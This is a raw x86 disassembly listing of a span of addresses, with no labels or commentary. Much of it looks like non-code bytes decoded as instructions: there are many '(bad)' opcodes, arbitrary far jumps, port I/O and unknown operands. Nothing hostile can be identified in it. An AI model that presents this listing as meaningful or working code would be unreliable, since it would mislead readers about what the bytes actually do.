  41c5b6:	stos   DWORD PTR es:[edi],eax
  41c5b7:	jmp    0x215b:0xb5e43a1a
  41c5be:	or     BYTE PTR [edi+0x75],dh
  41c5c1:	inc    edx
  41c5c2:	pop    ss
  41c5c3:	xor    ah,BYTE PTR [esi+0x4703a6eb]
  41c5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5ca:	in     eax,0xd3
  41c5cc:	mov    eax,ds:0x88014a7c
  41c5d1:	outs   dx,DWORD PTR ds:[esi]
  41c5d2:	fimul  WORD PTR [esi]
  41c5d4:	or     ah,BYTE PTR [edx]
  41c5d6:	popa   
  41c5d7:	retf   0xb86e
  41c5da:	stc    
  41c5db:	fidivr WORD PTR [esi]
  41c5dd:	add    BYTE PTR [esi+ecx*4],ah
  41c5e0:	fcom   QWORD PTR [eax-0x59]
  41c5e3:	xchg   ecx,eax
  41c5e4:	mov    bl,0xed
  41c5e6:	inc    ebx
  41c5e7:	fs push esp
  41c5e9:	scas   eax,DWORD PTR es:[edi]
  41c5ea:	retf   0x9297
  41c5ed:	or     eax,0x0
	...
  41c656:	lds    esp,FWORD PTR [ebx]
  41c658:	xchg   ecx,eax
  41c659:	and    eax,0xe3f5b7f7
  41c65e:	inc    ebx
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0xac33d605
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	dec    edx
  41c66f:	outs   dx,DWORD PTR ds:[esi]
  41c670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c671:	lods   al,BYTE PTR ds:[esi]
  41c672:	fs iret 
  41c674:	xchg   edi,eax
  41c675:	out    dx,eax
  41c676:	popf   
  41c677:	dec    ecx
  41c678:	xor    DWORD PTR fs:[bx+si],edi
  41c67c:	xor    eax,0x950492a2
  41c681:	loopne 0x41c6f9
  41c683:	out    0x61,eax
  41c685:	jp     0x41c654
  41c687:	hlt    
  41c688:	jl     0x41c69e
  41c68a:	mov    al,0x7a
  41c68c:	stos   BYTE PTR es:[edi],al
  41c68d:	ja     0x41c700
  41c68f:	aaa    
  41c690:	jns    0x41c61a
  41c692:	int3   
  41c693:	jg     0x41c6fc
  41c695:	jmp    0x7a389a8d
  41c69a:	gs (bad) 
  41c69c:	mov    bl,0x3a
  41c69e:	push   edi
  41c69f:	push   ecx
  41c6a1:	sbb    al,0xb7
  41c6a3:	je     0x41c708
  41c6a5:	stc    
  41c6a6:	jnp    0x41c6c7
  41c6a8:	xchg   BYTE PTR [esi+0x4d50d161],ch
  41c6ae:	mov    ecx,0x7cd86958
  41c6b3:	sbb    DWORD PTR [ecx],esi
  41c6b5:	xchg   ebx,eax
  41c6b6:	and    BYTE PTR ds:0x4bca504f,dh
  41c6bc:	out    0x45,eax
  41c6be:	lds    ebp,FWORD PTR [edx-0xc]
  41c6c1:	fisttp DWORD PTR [esi+eax*1-0x6fb34316]
  41c6c8:	outs   dx,BYTE PTR ds:[esi]
  41c6c9:	jmp    0x74cbb93
  41c6ce:	mov    ds:0x9a6d581a,al
  41c6d3:	gs jne 0x41c72b
  41c6d6:	inc    ecx
  41c6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6d8:	scas   al,BYTE PTR es:[edi]
  41c6d9:	lahf   
  41c6da:	dec    edi
  41c6db:	test   al,0x3d
  41c6dd:	mov    ebp,0xe7ce470a
  41c6e2:	(bad)  
  41c6e4:	jbe    0x41c6ce
  41c6e6:	push   ds
  41c6e7:	add    BYTE PTR [esi],cl
  41c6e9:	and    BYTE PTR [edi],cl
  41c6eb:	and    al,0x84
  41c6ed:	jne    0x41c724
  41c6ef:	out    dx,al
  41c6f0:	adc    BYTE PTR ds:0x9d8f4e1b,bh
  41c6f6:	(bad)  
  41c6f7:	aas    
  41c6f8:	into   
  41c6f9:	and    eax,0x1a52ca20
  41c6fe:	fmul   QWORD PTR [ecx]
  41c700:	jl     0x41c6e8
  41c702:	or     edx,DWORD PTR [esi-0xf5f15e3]
  41c708:	outs   dx,BYTE PTR ds:[esi]
  41c709:	mov    bh,0x73
  41c70b:	mov    esp,0xb36b8899
  41c711:	inc    esp
  41c712:	jno    0x41c6d2
  41c714:	xor    eax,0x335fc8e
  41c719:	pop    ss
  41c71a:	inc    ebp
  41c71b:	mov    bh,0x1a
  41c71d:	pop    ds
  41c71e:	div    BYTE PTR [ebp-0x64c6cd22]
  41c724:	adc    DWORD PTR [edx+ebx*2-0x6a930ed2],edx
  41c72b:	sub    edx,DWORD PTR [esi+0x71]
  41c72e:	cli    
  41c72f:	dec    edx
  41c730:	repnz int 0x53
  41c733:	jge    0x41c739
  41c735:	and    BYTE PTR [edi],bl
  41c737:	leave  
  41c738:	ins    BYTE PTR es:[edi],dx
  41c739:	sbb    DWORD PTR [eax+eax*2+0x1c5f53b3],esp
  41c740:	xor    BYTE PTR [esi],ch
  41c742:	dec    edx
  41c743:	je     0x41c738
  41c745:	jecxz  0x41c739
  41c747:	fwait
  41c748:	test   eax,0xd13668f5
  41c74d:	leave  
  41c74e:	jae    0x41c716
  41c750:	sub    bl,cl
  41c752:	xchg   BYTE PTR [edx-0x8],cl
  41c755:	mov    eax,0xd2e78337
  41c75a:	mov    al,0x53
  41c75c:	lahf   
  41c75d:	and    dh,BYTE PTR [edi-0xa]
  41c760:	xlat   BYTE PTR ds:[ebx]
  41c761:	sub    DWORD PTR [ebx-0x75],ebp
  41c764:	mov    cl,0xd1
  41c766:	(bad)  
  41c767:	jb     0x41c708
  41c769:	rcr    BYTE PTR [edi],1
  41c76b:	push   0x2d
  41c76d:	inc    edi
	...
  41c7d6:	fiadd  DWORD PTR [ecx]
  41c7d8:	ret    0xdb86
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	jmp    0x67e1fda0
  41c7e7:	xor    al,BYTE PTR [ecx]
  41c7e9:	add    BYTE PTR [eax],al
  41c7eb:	add    DWORD PTR [eax],eax
  41c7ed:	add    BYTE PTR [ecx+0x31],dh
  41c7f0:	sbb    eax,0xfb22daea
  41c7f5:	(bad)  
  41c7f6:	fsub   DWORD PTR [edi-0x4d82cf32]
  41c7fc:	pop    ebx
  41c7fd:	xchg   edx,eax
  41c7fe:	or     esp,DWORD PTR [ebp+0x6c]
  41c801:	in     eax,0xdf
  41c803:	jge    0x41c87c
  41c805:	xlat   BYTE PTR ds:[ebx]
  41c806:	xchg   bh,ah
  41c808:	pop    edx
  41c809:	in     eax,dx
  41c80a:	xchg   ebx,eax
  41c80b:	or     BYTE PTR [edx-0x66],cl
  41c80e:	loopne 0x41c7ee
  41c810:	add    eax,0x62e0ef0a
  41c815:	pop    ds
  41c816:	push   ecx
  41c817:	fstp   st(4)
  41c819:	push   es
  41c81a:	xchg   edx,eax
  41c81b:	clc    
  41c81c:	lds    ebx,FWORD PTR [edi-0x48]
  41c81f:	xor    esi,DWORD PTR [esi+0x62268f0a]
  41c825:	outs   dx,DWORD PTR ds:[esi]
  41c826:	fdivr  st(1),st
  41c828:	inc    ebx
  41c829:	loop   0x41c812
  41c82b:	ins    DWORD PTR es:[edi],dx
  41c82c:	inc    ebx
  41c82d:	jbe    0x41c7ec
  41c82f:	or     esi,edi
  41c831:	inc    ebp
  41c832:	int3   
  41c833:	and    BYTE PTR [edi],dh
  41c835:	ret    
  41c836:	inc    ebp
  41c837:	sub    al,0xf1
  41c839:	inc    ebp
  41c83a:	icebp  
  41c83b:	mov    ebp,?
  41c83d:	xchg   esi,eax
  41c83e:	sahf   
  41c83f:	jb     0x41c7f9
  41c841:	out    0xcc,eax
  41c843:	push   es
  41c844:	ds inc ebx
  41c846:	rcr    DWORD PTR [edx+0xf],1
  41c849:	mov    BYTE PTR [edi+eax*4],0xc2
  41c84d:	cmp    al,0x3f
  41c84f:	push   ecx
  41c850:	cmc    
  41c851:	inc    ecx
  41c852:	pop    esi
  41c853:	fwait
  41c854:	popa   
  41c855:	or     al,0x65
  41c857:	push   ds
  41c858:	hlt    
  41c859:	xchg   BYTE PTR [edi],dl
  41c85b:	(bad)  
  41c85c:	mov    ds:0x4b39552a,eax
  41c861:	shr    DWORD PTR [esi+eiz*4],0xd9
  41c865:	fbstp  TBYTE PTR [edx+0x303eab7b]
  41c86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c86c:	out    0x2f,al
  41c86e:	mov    dh,0x3e
  41c870:	js     0x41c850
  41c872:	sub    dl,BYTE PTR [eax-0x2faebb17]
  41c878:	xlat   BYTE PTR ds:[ebx]
  41c879:	ins    BYTE PTR es:[edi],dx
  41c87a:	js     0x41c886
  41c87c:	lods   al,BYTE PTR ds:[esi]
  41c87d:	shl    DWORD PTR [esi+eax*1-0x21ce9e46],1
  41c884:	call   0xc4ca4a30
  41c889:	(bad)  
  41c88a:	test   DWORD PTR [ebx],0x49b77623
  41c890:	jge    0x41c86f
  41c892:	lods   eax,DWORD PTR ds:[esi]
  41c893:	dec    ebx
  41c894:	daa    
  41c895:	xchg   ebx,eax
  41c896:	and    edi,esp
  41c898:	add    al,0xc6
  41c89a:	sti    
  41c89b:	ins    BYTE PTR es:[edi],dx
  41c89c:	push   ebx
  41c89d:	xchg   ecx,eax
  41c89e:	inc    eax
  41c89f:	push   ebx
  41c8a0:	loop   0x41c86c
  41c8a2:	inc    ebp
  41c8a3:	cmp    DWORD PTR [ebx+0x3768869e],edx
  41c8a9:	je     0x41c843
  41c8ab:	fcomp  DWORD PTR [ecx]
  41c8ad:	daa    
  41c8ae:	mov    eax,ds:0x9b2060aa
  41c8b3:	retf   0x19d6
  41c8b6:	xor    BYTE PTR [eax+0x1],bh
  41c8b9:	jge    0x41c845
  41c8bb:	add    al,0xcf
  41c8bd:	sub    BYTE PTR [ebx+0x4a83afc0],cl
  41c8c3:	push   cs
  41c8c4:	mov    al,0x7
  41c8c6:	and    ebx,ebx
  41c8c8:	jne    0x41c939
  41c8ca:	adc    al,0xfe
  41c8cc:	mov    ecx,0xd8a427c8
  41c8d1:	mov    ss,WORD PTR [ecx]
  41c8d3:	or     DWORD PTR [eax+0x70],edi
  41c8d6:	adc    al,0x8e
  41c8d8:	and    DWORD PTR [eax+0x7c],eax
  41c8db:	ret    0x75e4
  41c8de:	fcomp  DWORD PTR [eax+0x5b6bf576]
  41c8e5:	push   ecx
  41c8e6:	fstp   QWORD PTR ds:0x10cbcb91
  41c8ec:	aad    0xbe
	...
  41c956:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c95d:	ja     0x41c977
  41c95f:	sub    DWORD PTR [ebx],edi
  41c961:	add    DWORD PTR [esi+0x6c],ecx
  41c964:	les    esi,FWORD PTR [ecx+0x67]
  41c967:	xor    eax,DWORD PTR [ecx]
  41c969:	add    BYTE PTR [eax],al
  41c96b:	add    DWORD PTR [eax],eax
  41c96d:	add    dl,bl
  41c96f:	mov    ds:0x65c6ba91,eax
  41c974:	sub    DWORD PTR [edx+0x28515a08],0xe67e6a23
  41c97e:	mov    bl,0x92
  41c980:	adc    al,0x59
  41c982:	test   eax,0x698108e4
  41c987:	popf   
  41c988:	push   ds
  41c989:	or     eax,0x15ae35f5
  41c98e:	stc    
  41c98f:	pop    eax
  41c990:	pop    edi
  41c991:	in     al,dx
  41c992:	sub    eax,0x328e1a13
  41c997:	enter  0x8f60,0x6e
  41c99b:	xor    al,0x1d
  41c99d:	mov    DWORD PTR [ebx],ebp
  41c99f:	xchg   BYTE PTR [esi-0xb9cd1e8],al
  41c9a5:	mov    WORD PTR [edx],?
  41c9a7:	adc    bl,BYTE PTR [edi]
  41c9a9:	push   esp
  41c9aa:	js     0x41ca20
  41c9ac:	fsubr  DWORD PTR [edx+ebp*1]
  41c9af:	xor    edi,DWORD PTR [edi-0x40be0cfd]
  41c9b5:	xchg   DWORD PTR [ecx+0x3de28d9],esi
  41c9bb:	sbb    eax,0x270d330b
  41c9c0:	test   BYTE PTR [ecx],ah
  41c9c2:	repnz push cs
  41c9c4:	mov    edx,0x5e30b4b8
  41c9c9:	mov    ds:0x61ddbd15,al
  41c9ce:	shl    BYTE PTR [ebp+0x4e66882],cl
  41c9d4:	mov    bh,0xee
  41c9d6:	stc    
  41c9d7:	sub    eax,0x952564d9
  41c9dc:	push   ds
  41c9dd:	imul   ebx,DWORD PTR [edx-0x6406aa3],0x4a
  41c9e4:	arpl   WORD PTR [eax],ax
  41c9e6:	push   es
  41c9e7:	or     DWORD PTR [eax+esi*8],ecx
  41c9ea:	cmp    eax,0xe7a3f773
  41c9ef:	jb     0x41c9a4
  41c9f1:	rol    BYTE PTR [esi],cl
  41c9f3:	mov    al,0x56
  41c9f5:	jl     0x41c9a9
  41c9f7:	aaa    
  41c9f8:	lea    edx,[eax+0x6a61c216]
  41c9fe:	lock cmp edx,0xffffff9f
  41ca02:	test   al,0x7f
  41ca04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca05:	test   dl,ch
  41ca07:	repz pop ds
  41ca09:	in     al,dx
  41ca0a:	mov    esi,DWORD PTR [edx+0x235ae5e9]
  41ca10:	mov    ecx,DWORD PTR [ecx+0x6e]
  41ca13:	fcomp  QWORD PTR ss:[ebp+eiz*2+0x1b]
  41ca18:	rcr    DWORD PTR [ebx-0x44fb1359],cl
  41ca1e:	adc    DWORD PTR [edx+ebp*4-0x38bf6d83],edi
  41ca25:	lds    ebx,FWORD PTR [ecx+0x6d]
  41ca28:	retf   0x7e82
  41ca2b:	rol    DWORD PTR [edx],1
  41ca2d:	inc    ebx
  41ca2e:	bound  esp,QWORD PTR [esi-0x94ca0b3]
  41ca34:	adc    eax,0x837ef300
  41ca39:	sbb    esi,DWORD PTR [esi+0x7d]
  41ca3c:	sbb    eax,0x593efdf3
  41ca41:	or     esp,eax
  41ca43:	xchg   esp,eax
  41ca44:	and    BYTE PTR [edi+0x54c02ebf],dh
  41ca4a:	in     al,dx
  41ca4b:	inc    eax
  41ca4c:	popa   
  41ca4d:	adc    eax,ecx
  41ca4f:	enter  0xa732,0xac
  41ca53:	std    
  41ca54:	mov    ch,0xbc
  41ca56:	nop
  41ca57:	and    DWORD PTR [edx+0x732ad285],ecx
  41ca5d:	cld    
  41ca5e:	jmp    0x4bcdb04b
  41ca63:	or     al,0x6a
  41ca65:	jg     0x41ca73
  41ca67:	ja     0x41ca8a
  41ca69:	cmp    esp,0xeed27a
	...
  41cad3:	add    BYTE PTR [eax],al
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	retf   0xa6f5
  41cae5:	leave  
  41cae6:	addr16 xor al,0x1
  41cae9:	add    BYTE PTR [eax],al
  41caeb:	add    DWORD PTR [eax],eax
  41caed:	add    BYTE PTR [esi-0x246780e],dh
  41caf3:	inc    esp
  41caf4:	pop    es
  41caf5:	cmp    edi,ebx
  41caf7:	aas    
  41caf8:	cli    
  41caf9:	arpl   bx,dx
  41cafb:	jnp    0x41caf6
  41cafd:	retf   
  41cafe:	mov    WORD PTR [ecx],ss
  41cb00:	mov    edx,0xc3a39839
  41cb05:	jmp    0x41cacd
  41cb07:	jl     0x41cae0
  41cb09:	add    BYTE PTR [ecx],cl
  41cb0b:	mov    cl,0x9a
  41cb0d:	mov    ebp,0x1d3f10b
  41cb12:	inc    ecx
  41cb13:	jp     0x41cb09
  41cb15:	jge    0x41cad8
  41cb17:	xchg   ebp,eax
  41cb18:	les    ecx,FWORD PTR [ecx-0x7]
  41cb1b:	and    bl,ch
  41cb1d:	cmp    al,0xd
  41cb1f:	mov    ds:0x9b53dc6c,al
  41cb24:	das    
  41cb25:	dec    edx
  41cb26:	std    
  41cb27:	out    0x72,al
  41cb29:	sti    
  41cb2a:	dec    eax
  41cb2b:	mov    al,0xed
  41cb2d:	iret   
  41cb2e:	mov    bl,0xb5
  41cb30:	fsub   DWORD PTR [esi]
  41cb32:	sbb    DWORD PTR [ebx+0x3ab819f5],edx
  41cb38:	mov    ebp,eax
  41cb3a:	in     al,0xba
  41cb3c:	pop    esp
  41cb3d:	adc    al,0x34
  41cb3f:	adc    BYTE PTR cs:[ebp+0x4a4bd2d0],cl
  41cb46:	mov    eax,0xf3adb1ee
  41cb4b:	out    0xe8,eax
  41cb4d:	scas   al,BYTE PTR es:[edi]
  41cb4e:	push   ss
  41cb4f:	loop   0x41cb5a
  41cb51:	mov    WORD PTR [edi],?
  41cb53:	in     eax,dx
  41cb54:	sbb    eax,0x903af3dc
  41cb59:	add    eax,0xa6f1c1cf
  41cb5e:	addr16 das 
  41cb60:	stos   BYTE PTR es:[edi],al
  41cb61:	test   al,0x2b
  41cb63:	push   es
  41cb64:	test   eax,0xb9367704
  41cb69:	cmp    al,0xc1
  41cb6b:	ins    DWORD PTR es:[edi],dx
  41cb6c:	fidivr WORD PTR [edx-0x3ee1af8]
  41cb72:	je     0x41cbf3
  41cb74:	call   0x2eb:0xca0bf515
  41cb7b:	lahf   
  41cb7c:	test   al,0xf9
  41cb7e:	adc    DWORD PTR [ebp+0x70768338],ecx
  41cb84:	mov    ds:0x882a7a27,eax
  41cb89:	repz out dx,eax
  41cb8b:	cli    
  41cb8c:	sub    DWORD PTR [ebx+0x626d29ac],edx
  41cb92:	sub    ebx,edx
  41cb94:	in     eax,0x8e
  41cb96:	xchg   WORD PTR [edi],di
  41cb99:	xchg   ebp,eax
  41cb9a:	pop    es
  41cb9b:	push   ebx
  41cb9c:	int3   
  41cb9d:	(bad)  
  41cb9e:	mov    ecx,0x3986ec9
  41cba3:	pop    ds
  41cba4:	push   ss
  41cba5:	add    bl,BYTE PTR [esi+0x7d942345]
  41cbab:	daa    
  41cbac:	ficomp WORD PTR [edi-0x36]
  41cbaf:	(bad)  
  41cbb1:	inc    ebp
  41cbb2:	add    ah,BYTE PTR [ebx-0x1ab145de]
  41cbb8:	xchg   esp,eax
  41cbb9:	xchg   edx,eax
  41cbba:	or     DWORD PTR [ecx-0x42],ebp
  41cbbd:	jp     0x41cc08
  41cbbf:	push   edi
  41cbc0:	xor    ecx,DWORD PTR [eax+0x51]
  41cbc3:	nop
  41cbc4:	lods   eax,DWORD PTR ds:[esi]
  41cbc5:	mov    ecx,0x8cd775f0
  41cbca:	mov    dl,0x47
  41cbcc:	jl     0x41cbd1
  41cbce:	jo     0x41cb92
  41cbd0:	jne    0x41cc1b
  41cbd2:	test   eax,0x584a59aa
  41cbd7:	mov    eax,ds:0x87349a32
  41cbdc:	das    
  41cbdd:	xchg   ecx,eax
  41cbde:	jle    0x41cbab
  41cbe0:	iret   
  41cbe1:	aad    0x71
  41cbe3:	push   edi
  41cbe4:	pushf  
  41cbe5:	push   ds
  41cbe6:	jns    0x41cc5c
  41cbe8:	or     bh,BYTE PTR [ecx-0x1ed45abe]
	...
  41cc56:	sub    esi,edx
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x40ef7322
  41cc65:	mov    al,0x67
  41cc67:	xor    eax,0x1000001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	inc    ecx
  41cc6f:	push   esp
  41cc70:	push   edi
  41cc71:	sar    BYTE PTR [edx+0x3201236b],0xae
  41cc78:	test   DWORD PTR [edx-0x3d6aa7b],0xd631ec49
  41cc82:	pop    ss
  41cc83:	mov    edi,0x94aaaa5
  41cc88:	mov    bl,0x71
  41cc8a:	ins    DWORD PTR es:[edi],dx
  41cc8b:	sbb    bl,BYTE PTR [esi]
  41cc8d:	dec    edx
  41cc8e:	pop    edi
  41cc8f:	xor    eax,DWORD PTR [edi+0x19]
  41cc92:	popf   
  41cc93:	popa   
  41cc94:	dec    edx
  41cc95:	mov    DWORD PTR [eax-0x5d],0xc50bebbd
  41cc9c:	sbb    ebp,DWORD PTR [ebp-0x3d20db6f]
  41cca2:	ins    BYTE PTR es:[edi],dx
  41cca3:	xchg   ebp,eax
  41cca4:	sbb    ebp,DWORD PTR [edx-0x627bb70f]
  41ccaa:	pop    ds
  41ccab:	cmp    eax,DWORD PTR [edi+0x6]
  41ccae:	jle    0x41cd02
  41ccb0:	lock add edi,esp
  41ccb3:	(bad)  
  41ccb4:	aam    0xf6
  41ccb6:	mov    ds:0x38bd716a,al
  41ccbb:	icebp  
  41ccbc:	jno    0x41cc43
  41ccbe:	add    BYTE PTR [esi],0x25
  41ccc1:	dec    ecx
  41ccc2:	lods   al,BYTE PTR ds:[esi]
  41ccc3:	(bad)  
  41ccc4:	mov    bl,0x91
  41ccc6:	div    al
  41ccc8:	mov    ebx,0xc0b6cc9b
  41cccd:	ja     0x41ccf8
  41cccf:	mov    bh,0xa
  41ccd1:	cmp    esp,esp
  41ccd3:	add    ch,dh
  41ccd5:	jo     0x41cd10
  41ccd7:	mov    ds:0xa4d1be5a,al
  41ccdc:	jo     0x41cc6f
  41ccde:	cmp    al,0x61
  41cce0:	scas   eax,DWORD PTR es:[edi]
  41cce1:	push   eax
  41cce2:	outs   dx,DWORD PTR ds:[esi]
  41cce3:	jle    0x41cd19
  41cce5:	test   esp,eax
  41cce7:	aas    
  41cce8:	jno    0x41cc8b
  41ccea:	(bad)  
  41cceb:	xlat   BYTE PTR ds:[ebx]
  41ccec:	and    edi,DWORD PTR [eax-0x7e]
  41ccef:	inc    edx
  41ccf0:	mov    ebp,0x95b6612d
  41ccf5:	inc    ebx
  41ccf6:	fadd   QWORD PTR [esi-0x221283fe]
  41ccfc:	out    0x82,al
  41ccfe:	retf   0x2f18
  41cd01:	xchg   edx,eax
  41cd02:	(bad)  
  41cd03:	sahf   
  41cd04:	adc    al,0xdf
  41cd06:	or     ecx,DWORD PTR [ebx]
  41cd08:	fwait
  41cd09:	scas   al,BYTE PTR es:[edi]
  41cd0a:	mov    ch,0x6c
  41cd0c:	inc    ebx
  41cd0d:	jne    0x41cd0d
  41cd0f:	rcl    DWORD PTR [ecx-0x5],cl
  41cd12:	mov    edi,0xed1aa0dc
  41cd17:	xchg   ebx,eax
  41cd18:	lods   eax,DWORD PTR ds:[esi]
  41cd19:	sbb    eax,0xe37d480c
  41cd1e:	dec    ebx
  41cd1f:	pop    eax
  41cd20:	lahf   
  41cd21:	(bad)
  41cd24:	push   esp
  41cd25:	mov    ds:0x32c8f3c,al
  41cd2a:	fsub   QWORD PTR [eax+0x7e345e0a]
  41cd30:	shr    DWORD PTR [ecx+0x0],cl
  41cd33:	dec    esp
  41cd34:	push   di
  41cd36:	aad    0x18
  41cd38:	mov    DWORD PTR [edi-0x9ba207d],ebx
  41cd3e:	fbld   TBYTE PTR [ecx+0x13]
  41cd41:	inc    esp
  41cd42:	or     DWORD PTR [ebp+ebx*2+0x598fab3a],ebp
  41cd49:	xchg   edi,eax
  41cd4a:	jmp    0xd14ff84e
  41cd4f:	(bad)  
  41cd51:	jmp    0x94fa:0xe59e1897
  41cd58:	inc    eax
  41cd59:	pop    ss
  41cd5a:	jbe    0x41cd79
  41cd5c:	push   es
  41cd5d:	adc    eax,0x430d2389
  41cd62:	add    BYTE PTR [ebx+0x6],al
  41cd65:	cld    
  41cd66:	jge    0x41ccfa
  41cd68:	dec    ebp
  41cd69:	or     DWORD PTR [ecx+0x4a],ebp
  41cd6c:	mov    edi,0xca
	...
  41cdd5:	add    BYTE PTR [eax-0x67],ah
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	pop    edx
  41cde3:	or     DWORD PTR [ebp+0x136675d],0x10000
  41cded:	add    BYTE PTR [ebx],ch
  41cdef:	inc    ebp
  41cdf0:	add    DWORD PTR [ecx-0x9f6174],0x7
  41cdf7:	pop    ecx
  41cdf8:	jno    0x41ce36
  41cdfa:	xor    eax,0x92495e3
  41cdff:	std    
  41ce00:	jmp    0x93d7b59d
  41ce05:	int3   
  41ce06:	or     al,0x6d
  41ce08:	jno    0x41ce10
  41ce0a:	and    DWORD PTR [ebx-0x42],edi
  41ce0d:	dec    ecx
  41ce0e:	out    0xf5,al
  41ce10:	sub    eax,0x29f860f1
  41ce15:	mov    ds:0x8707c102,al
  41ce1a:	xor    bl,bh
  41ce1c:	pop    eax
  41ce1d:	mov    ebp,DWORD PTR [edi+0x59d3153d]
  41ce23:	inc    ebx
  41ce24:	inc    eax
  41ce25:	sbb    DWORD PTR [ebp-0x633301bc],esi
  41ce2b:	ret    0x9325
  41ce2e:	fucomi st,st(7)
  41ce30:	pop    ebx
  41ce31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce32:	mov    bl,0x84
  41ce34:	push   edi
  41ce35:	repz sub DWORD PTR [ebp-0x52b365e8],eax
  41ce3c:	xor    ecx,eax
  41ce3e:	enter  0x8a1d,0xfc
  41ce42:	push   eax
  41ce43:	add    DWORD PTR [edx+0x75],esi
  41ce46:	xchg   esi,eax
  41ce47:	bound  edi,QWORD PTR [ebp+0x36]
  41ce4a:	mul    al
  41ce4c:	or     ebp,edi
  41ce4e:	push   esi
  41ce4f:	ja     0x41ce58
  41ce51:	mul    BYTE PTR [ebp+0x17]
  41ce54:	jbe    0x41ce72
  41ce56:	mov    al,ds:0x40f1a79e
  41ce5b:	out    0x2f,al
  41ce5d:	std    
  41ce5e:	xor    eax,0xb9a74746
  41ce63:	mov    al,0x7c
  41ce65:	ja     0x41ce1c
  41ce67:	cmp    ebx,DWORD PTR [edi-0x5d88dad0]
  41ce6d:	in     eax,0x84
  41ce6f:	sbb    ebx,DWORD PTR ds:0x77a5e7fc
  41ce75:	lea    edx,[eax+0x40d6b8a6]
  41ce7b:	retf   
  41ce7c:	and    DWORD PTR ds:0x24d9f5d2,esi
  41ce82:	xor    eax,0x19
  41ce85:	add    dl,BYTE PTR [eax-0x654f766a]
  41ce8b:	mov    ds:0x6af67f47,al
  41ce90:	iret   
  41ce91:	inc    eax
  41ce92:	sub    al,0x53
  41ce94:	into   
  41ce95:	pop    es
  41ce96:	jmp    0x41ceee
  41ce98:	(bad)  
  41ce99:	pop    ebp
  41ce9a:	test   eax,0xdc697df
  41ce9f:	fs out 0x8f,eax
  41cea2:	mov    al,0xa6
  41cea4:	inc    esi
  41cea5:	aad    0x7c
  41cea7:	imul   esi,DWORD PTR [eax+0x66b030c0],0x6c
  41ceae:	mov    ebp,0x3765966d
  41ceb3:	push   ecx
  41ceb4:	cmp    eax,0xc41695e
  41ceb9:	jns    0x41cf09
  41cebb:	call   0x1a5:0x9f4844d6
  41cec2:	mov    bh,0x53
  41cec4:	mov    bl,0x47
  41cec6:	leave  
  41cec7:	call   0x9b67:0x5da50b
  41cece:	sti    
  41cecf:	sub    esi,DWORD PTR [eax+0x281737e0]
  41ced5:	cmp    eax,0xa5d846c
  41ceda:	fsubrp st(4),st
  41cedc:	mov    ecx,0xb7952cb9
  41cee1:	scas   al,BYTE PTR es:[edi]
  41cee2:	mov    WORD PTR [ebp-0x7a9eceb2],ss
  41cee8:	mov    bh,0x1d
  41ceea:	scas   eax,DWORD PTR es:[edi]
  41ceeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceec:	clc    
  41ceed:	mov    ebx,0x0
	...
  41cf56:	pop    es
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	ja     0x41cf6f
  41cf64:	jle    0x41cf15
  41cf66:	addr16 aaa 
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	cmp    dl,BYTE PTR [ebx-0x40]
  41cf71:	icebp  
  41cf72:	xchg   ebx,eax
  41cf73:	dec    esi
  41cf74:	xor    esi,DWORD PTR [eax-0x80]
  41cf77:	push   ebp
  41cf78:	xor    esi,edi
  41cf7a:	mov    ds,WORD PTR [eiz*1+0x24117958]
  41cf81:	ret    
  41cf82:	mov    ds:0xa89921d,eax
  41cf87:	sbb    al,0x3
  41cf89:	mov    ebx,0x3021fd12
  41cf8e:	dec    esp
  41cf8f:	scas   eax,DWORD PTR es:[edi]
  41cf90:	and    eax,0x2cf8bb28
  41cf95:	mov    ch,0x81
  41cf97:	adc    ebx,edx
  41cf99:	lods   al,BYTE PTR ds:[esi]
  41cf9a:	cmp    esi,ebp
  41cf9c:	stc    
  41cf9d:	inc    ebp
  41cf9e:	lahf   
  41cf9f:	mov    cl,0xbd
  41cfa1:	mov    edx,edi
  41cfa3:	jnp    0x41cf79
  41cfa5:	shl    BYTE PTR [ecx],0x3d
  41cfa8:	shl    BYTE PTR [edi-0x2e6df56b],cl
  41cfae:	jle    0x41cfc0
  41cfb0:	xchg   edi,eax
  41cfb1:	jne    0x41d018
  41cfb3:	(bad)  [ebx-0x4d]
  41cfb6:	psraw  mm6,QWORD PTR [edx+0x6a]
  41cfba:	adc    al,BYTE PTR [edx]
  41cfbc:	aam    0x54
  41cfbe:	mov    cs,WORD PTR [ebp+0x75]
  41cfc1:	mov    bh,0xac
  41cfc3:	and    BYTE PTR [ebx+0x70],bl
  41cfc6:	adc    bl,BYTE PTR [eax+0x34]
  41cfc9:	(bad)  
  41cfca:	(bad)  
  41cfcb:	mov    edi,0x45ed5148
  41cfd0:	push   ebx
  41cfd1:	jmp    0xbb0e4e53
  41cfd6:	xor    ch,bh
